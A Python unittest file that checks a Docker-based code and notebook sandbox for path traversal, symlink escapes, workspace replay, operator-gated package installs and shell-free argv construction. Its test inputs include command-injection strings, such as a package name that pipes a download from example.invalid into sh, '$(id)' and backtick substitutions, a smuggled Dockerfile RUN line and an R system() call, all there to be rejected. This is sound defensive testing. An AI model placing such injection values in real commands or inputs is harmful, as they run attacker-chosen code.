"""F1/F3/F5: real registered handlers, fake Docker IO, NOT kernel isolation.

Standard-library unittest also permits running in dependency-free checkouts.
"""
import asyncio
import json
import subprocess
import tempfile
import unittest
from dataclasses import replace
from pathlib import Path
from unittest.mock import AsyncMock, patch

from dream.bridge.errors import BridgeError
from dream.bridge.methods import BridgeMethods
from dream.docker_sandbox import DockerSandbox, SandboxResult
from dream.security.codeexec import (
    CodeExecutionDenied,
    CodeExecutionRequest,
    CodeExecutionRuntime,
    reset_code_execution_runtime,
)


class Boundaries(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.notebooks = self.root / "notebooks"
        self.notebooks.mkdir()
        self.sb = DockerSandbox(data_dir=str(self.root / "data"), notebook_root=self.notebooks)
        self.sb._ensure_image = AsyncMock()
        self.sb._exec_in_container = AsyncMock(return_value=SandboxResult(return_code=0))
        self.sb._run_docker_cmd_with_output = AsyncMock(return_value=("", ""))
        self.bridge = BridgeMethods(**{
            k: str(self.root / v) for k, v in {
                "sessions_path": "s.json", "projects_path": "p.json",
                "disabled_skills_path": "d.json", "providers_path": "pr.json",
                "provenance_dir": "prov", "mcp_config_path": "m.json",
                "acp_config_path": "a.json",
            }.items()
        })
        self.bridge.sandbox = self.sb
        self.runtime = CodeExecutionRuntime(self.sb, root=self.root / "code")
        reset_code_execution_runtime(self.runtime)
        self.addCleanup(reset_code_execution_runtime)

    def call(self, method, params):
        return asyncio.run(self.bridge.handlers[method](params))

    def notebook(self, name="hello.ipynb"):
        path = self.notebooks / name
        path.write_text(json.dumps({"nbformat": 4, "nbformat_minor": 5,
                                    "metadata": {}, "cells": []}))
        return path

    def test_code_rejects_all_caller_selected_ids_and_paths(self):
        for value in [".", "..", "runs", "a/b", "a\\b", "/tmp", "exe-other",
                      str(self.runtime.root), str(self.runtime.root / "runs" / "another")]:
            for field in ["execution_id", "workspace"]:
                with self.subTest(field=field, value=value):
                    result = self.call("sandbox.run_code", {"code": "print(1)", field: value})
                    self.assertEqual(result["status"], "denied")
                    self.assertEqual(result["result"]["error"]["code"], "removed_field")
        self.assertFalse(self.runtime.root.exists())

    def test_workspace_unique_cannot_adopt_or_replay(self):
        first = CodeExecutionRequest.from_params({"code": "1"}, sandbox_root=self.runtime.root)
        second = CodeExecutionRequest.from_params({"code": "1"}, sandbox_root=self.runtime.root)
        a = self.runtime.workspace_for(first)
        b = self.runtime.workspace_for(second)
        self.assertNotEqual(a, b)
        self.assertEqual(a.parent, self.runtime.root / "runs")
        with self.assertRaises(CodeExecutionDenied):
            self.runtime.workspace_for(
                replace(second, execution_id=first.execution_id, workspace=a))
        self.sb.check_available = AsyncMock(return_value=True)
        self.sb.run_code = AsyncMock(return_value=SandboxResult(return_code=0))
        self.assertEqual(asyncio.run(self.runtime.run(first)).status.value, "success")
        self.assertEqual(asyncio.run(self.runtime.run(first)).status.value, "denied")
        self.sb.run_code.assert_awaited_once()

    def test_symlink_runs_denied_before_side_effect_and_reset(self):
        self.runtime.root.mkdir()
        outside = self.root / "outside"
        outside.mkdir()
        marker = outside / "keep"
        marker.write_text("safe")
        (self.runtime.root / "runs").symlink_to(outside, target_is_directory=True)
        req = CodeExecutionRequest.from_params({"code": "1"}, sandbox_root=self.runtime.root)
        with self.assertRaises(CodeExecutionDenied):
            self.runtime.workspace_for(req)
        self.assertEqual(list(outside.iterdir()), [marker])
        self.assertEqual(self.runtime.reset()["removed"], 0)
        self.assertEqual(marker.read_text(), "safe")

    def test_artifact_and_overflow_symlinks_never_followed(self):
        req = CodeExecutionRequest.from_params({"code": "1"}, sandbox_root=self.runtime.root)
        ws = self.runtime.workspace_for(req)
        outside = self.root / "secret"
        outside.write_text("safe")
        (ws / "stdout.txt").symlink_to(outside)
        (ws / "artifact").symlink_to(outside)
        (ws / "safe.txt").write_text("artifact")
        self.assertEqual([a["name"] for a in self.runtime._artifacts_for(req)], ["safe.txt"])
        self.assertEqual(self.runtime._persist_overflow(req, "bad", "err")[0], "")
        self.assertEqual(outside.read_text(), "safe")
        self.runtime.reset()
        self.assertEqual(outside.read_text(), "safe")

    def test_notebook_outside_and_symlink_paths_denied(self):
        outside = self.root / "outside.ipynb"
        outside.write_text('{"nbformat":4}')
        link = self.notebooks / "link.ipynb"
        link.symlink_to(outside)
        for path in [outside, link, self.notebooks / ".." / "outside.ipynb"]:
            with self.subTest(path=path), self.assertRaises(BridgeError) as caught:
                self.call("sandbox.run_notebook", {"notebook_path": str(path)})
            self.assertEqual(caught.exception.data["status"], "denied")
        self.sb._ensure_image.assert_not_awaited()
        self.sb._exec_in_container.assert_not_awaited()

    def test_notebook_punctuation_is_not_shell_and_only_staging_is_mounted(self):
        for name in ["has space.ipynb", "quote'\".ipynb", "semi;colon.ipynb",
                     "$(touch evil).ipynb", "`touch evil`.ipynb"]:
            path = self.notebook(name)
            original = path.read_bytes()
            result = self.call("sandbox.run_notebook", {"notebook_path": str(path)})
            self.assertEqual(result["return_code"], 0)
            kwargs = self.sb._exec_in_container.await_args.kwargs
            workspace = kwargs["workspace"]
            self.assertEqual(workspace.parent, self.sb._data_dir / "notebook-runs")
            self.assertNotEqual(workspace, path.parent)
            self.assertEqual((workspace / "input.ipynb").read_bytes(), original)
            self.assertIsInstance(kwargs["exec_command"], list)
            self.assertNotIn(name, kwargs["exec_command"])
            self.assertNotIn("/bin/sh", kwargs["exec_command"])
            self.assertEqual(path.read_bytes(), original)

    def test_notebook_bad_names_kernels_and_timeout_denied(self):
        path = self.notebook()
        for extra in [{"notebook_path": str(self.notebook("bad\nname.ipynb"))},
                      {"kernel": "python3;id"}, {"timeout": "30"}, {"timeout": True},
                      {"timeout": 601}, {"workspace": "/etc"}]:
            with self.subTest(extra=extra), self.assertRaises(BridgeError):
                self.call("sandbox.run_notebook", {"notebook_path": str(path), **extra})
        self.sb._exec_in_container.assert_not_awaited()

    def test_notebook_missing_root_and_runner_structured_errors(self):
        path = self.notebook()
        self.sb._notebook_root = None
        with self.assertRaises(BridgeError) as caught:
            self.call("sandbox.run_notebook", {"notebook_path": str(path)})
        self.assertEqual(caught.exception.data["status"], "denied")
        self.sb._notebook_root = self.notebooks
        self.sb._ensure_image.side_effect = FileNotFoundError("docker")
        with self.assertRaises(BridgeError) as caught:
            self.call("sandbox.run_notebook", {"notebook_path": str(path)})
        # Missing Docker binary should be unavailable, not an internal traceback.
        self.assertEqual(caught.exception.data["status"], "unavailable")

    def test_invalid_packages_no_build_or_mutation_even_when_approved(self):
        self.sb._package_install_approved = True
        images = dict(self.sb.DEFAULT_IMAGES)
        for packages in [None, "requests", [], [1], [None], ["requests"] * 65,
                         ["x" * 129], ["requests; curl https://example.invalid/x | sh"],
                         ["x\nRUN touch /evil"], ["--index-url"], ["-r"],
                         ["requests>=?"], ["pkg @ https://example.invalid/x"],
                         ["foo\x00"], ["foo`id`"], ["foo$(id)"], ["foo=="],
                         ["foo==bad..version"], ["foo==1..2"],
                         ["foo[extra]"], ["foo;python_version>'3'"]]:
            with self.subTest(packages=packages), self.assertRaises(BridgeError):
                self.call("sandbox.install_packages", {"packages": packages})
        self.sb._run_docker_cmd_with_output.assert_not_awaited()
        self.assertFalse((self.sb._data_dir / "builds").exists())
        self.assertEqual(images, self.sb.DEFAULT_IMAGES)

    def test_install_operator_gate_cannot_be_overridden_by_rpc(self):
        for args in [{"packages": ["requests==2.32.3"]},
                     {"packages": ["requests"], "approved": True},
                     {"packages": ["requests"], "package_install_approved": True}]:
            with self.subTest(args=args), self.assertRaises(BridgeError):
                self.call("sandbox.install_packages", args)
        self.sb._run_docker_cmd_with_output.assert_not_awaited()
        self.assertFalse((self.sb._data_dir / "builds").exists())

    def test_valid_package_build_is_json_argv_and_environment_minimal(self):
        self.sb._package_install_approved = True
        captured = []

        async def build(cmd, **kwargs):
            text = (Path(kwargs["cwd"]) / "Dockerfile").read_text()
            captured.append((cmd, kwargs, text))
            return "", ""

        self.sb._run_docker_cmd_with_output.side_effect = build
        before = dict(type(self.sb).DEFAULT_IMAGES)
        result = self.call("sandbox.install_packages", {"packages": ["requests==2.32.3", "numpy"]})
        self.assertTrue(result["success"])
        cmd, kwargs, text = captured[0]
        argv = json.loads(text.splitlines()[1].removeprefix("RUN "))
        self.assertEqual(argv[-3:], ["--", "requests==2.32.3", "numpy"])
        self.assertEqual(argv[:3], ["python", "-m", "pip"])
        self.assertIn("--network=default", cmd)
        self.assertEqual(set(kwargs["env"]), {"PATH", "HOME"})
        self.assertEqual(type(self.sb).DEFAULT_IMAGES, before)
        self.assertFalse(Path(kwargs["cwd"]).exists())

    def test_direct_install_validation_and_failed_build_never_change_images(self):
        self.sb._package_install_approved = True
        images = dict(self.sb.DEFAULT_IMAGES)
        with self.assertRaises(ValueError):
            asyncio.run(self.sb.install_packages(["x;id"]))
        self.sb._run_docker_cmd_with_output.assert_not_awaited()
        self.sb._run_docker_cmd_with_output.side_effect = subprocess.SubprocessError("failed")
        with self.assertRaises(BridgeError) as caught:
            self.call("sandbox.install_packages", {"packages": ["requests==2.32.3"]})
        self.assertEqual(caught.exception.code, -32010)
        self.assertEqual(self.sb.DEFAULT_IMAGES, images)
        self.assertEqual(list((self.sb._data_dir / "builds").iterdir()), [])

    def test_r_packages_build_safe_argv_and_reject_r_expression(self):
        self.sb._package_install_approved = True
        captured = []

        async def build(cmd, **kwargs):
            captured.append((Path(kwargs["cwd"]) / "Dockerfile").read_text())
            return "", ""

        self.sb._run_docker_cmd_with_output.side_effect = build
        self.call("sandbox.install_packages", {"packages": ["ggplot2"], "language": "r"})
        argv = json.loads(captured[0].splitlines()[1].removeprefix("RUN "))
        self.assertEqual(argv[:3], ["Rscript", "--vanilla", "-e"])
        self.assertIn("c('ggplot2')", argv[3])
        with self.assertRaises(BridgeError):
            self.call("sandbox.install_packages", {"packages": ["x');system('id"], "language": "r"})
        self.assertEqual(self.sb._run_docker_cmd_with_output.await_count, 1)

    def test_workspace_rechecks_after_creation(self):
        req = CodeExecutionRequest.from_params({"code": "1"}, sandbox_root=self.runtime.root)
        outside = self.root / "other"
        outside.mkdir()
        original = Path.mkdir

        def create(path, *args, **kwargs):
            original(path, *args, **kwargs)
            if path == req.workspace:
                path.rmdir()
                path.symlink_to(outside, target_is_directory=True)

        with patch.object(Path, "mkdir", create), self.assertRaises(CodeExecutionDenied):
            self.runtime.workspace_for(req)
        self.assertEqual(list(outside.iterdir()), [])

    def test_existing_run_and_cross_run_symlinks_are_not_adopted(self):
        req = CodeExecutionRequest.from_params({"code": "1"}, sandbox_root=self.runtime.root)
        req.workspace.mkdir(parents=True)
        with self.assertRaises(CodeExecutionDenied):
            self.runtime.workspace_for(req)
        other = CodeExecutionRequest.from_params({"code": "1"}, sandbox_root=self.runtime.root)
        other.workspace.symlink_to(req.workspace, target_is_directory=True)
        with self.assertRaises(CodeExecutionDenied):
            self.runtime.workspace_for(other)

    def test_reset_busy_does_not_drop_live_run_authority(self):
        req = CodeExecutionRequest.from_params({"code": "1"}, sandbox_root=self.runtime.root)
        ws = self.runtime.workspace_for(req)
        self.runtime._live[req.execution_id] = {}
        result = self.runtime.reset()
        self.assertEqual(result["status"], "busy")
        self.assertEqual(self.runtime.workspace_for(req), ws)

    def test_real_docker_argv_notebook_never_uses_shell(self):
        # Exercise the actual argv builder rather than just its invocation seam.
        self.sb._exec_in_container = DockerSandbox._exec_in_container.__get__(self.sb)
        path = self.notebook("semi;$(id).ipynb")
        self.call("sandbox.run_notebook", {"notebook_path": str(path)})
        cmd = next(c.args[0] for c in self.sb._run_docker_cmd_with_output.await_args_list
                   if c.args[0][0] == "run")
        self.assertNotIn("/bin/sh", cmd)
        self.assertNotIn("-c", cmd)
        self.assertIn("input.ipynb", cmd)
        mount = cmd[cmd.index("-v") + 1]
        self.assertIn("/notebook-runs/nb-", mount)
        self.assertTrue(mount.endswith(":/workspace:rw"))
        self.assertNotIn(str(self.notebooks), mount)


if __name__ == "__main__":
    unittest.main()
